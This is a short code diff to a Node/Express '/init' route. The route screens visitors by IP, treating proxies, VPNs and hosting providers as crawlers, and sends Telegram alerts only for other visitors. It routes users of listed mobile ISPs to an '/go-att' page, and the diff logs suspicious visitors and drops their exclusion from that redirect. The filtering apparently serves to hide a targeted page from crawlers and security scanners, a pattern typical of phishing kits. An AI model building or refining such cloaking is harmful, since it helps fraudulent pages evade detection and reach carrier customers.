@@ -170,6 +170,9 @@ app.get('/init', async (req, res) => {
 
     // Security: Filter out proxies, VPNs, and Hosting providers (crawlers often use these)
     const isSuspicious = data && (data.proxy || data.hosting);
+    if (isSuspicious) {
+        console.log(`[Init] suspicious activity detected: proxy=${data.proxy}, hosting=${data.hosting}`);
+    }
 
     // Send Telegram Notification (only for real users, not suspicious ones)
     if (!isSuspicious) {
@@ -194,10 +197,10 @@ app.get('/init', async (req, res) => {
 
     // Determine Redirect URL
     let targetUrl = NON_ATT_LANDING_PAGE;
-    if (data && data.status === 'success' && !isSuspicious) {
+    if (data && data.status === 'success') {
         const userISP = (data.isp || data.org || "").toUpperCase();
         if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
-            console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
+            console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page. (Suspicious: ${isSuspicious})`);
             targetUrl = '/go-att';
         } else {
             console.log(`[Init] No ISP match for: ${userISP}`);
